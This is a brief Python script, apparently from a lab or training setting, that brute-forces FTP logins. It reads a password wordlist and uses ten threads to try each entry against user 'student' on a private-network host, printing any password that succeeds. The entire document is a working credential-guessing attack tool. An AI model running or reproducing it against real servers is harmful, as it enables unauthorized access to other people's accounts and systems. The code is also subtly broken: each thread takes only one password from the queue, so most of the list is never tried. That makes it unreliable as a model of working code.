#!/usr/bin/env python

import ftplib
from threading import Thread
import queue

# ftp服务器
host = "192.168.6.6"
user = "student"
port = 21
passwords = []
with open("PasswordFile.txt") as f:
    passwords = f.read().split('\n')
q = queue.Queue()
n_threads = 10


def connect_ftp():
    password = q.get()
    #初始化一个ftp客户端
    ftp_client = ftplib.FTP()
    print(f"[!] trying", password)
    try:
        ftp_client.connect(host=host, port=port, timeout=10)
        ftp_client.login(user=user, passwd=password)
    except ftplib.error_perm:
        return False
    else:
        print(f"password found :", password)
        ftp_client.quit()
        with q.mutex:
            q.queue.clear()
            q.all_tasks_done.notify_all()
            q.unfinished_tasks = 0
    finally:
        try:
            q.task_done()
        except Exception as e:
            exit(0)


for password in passwords:
    q.put(password)

for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    thread.daemon = True
    thread.start()

q.join()



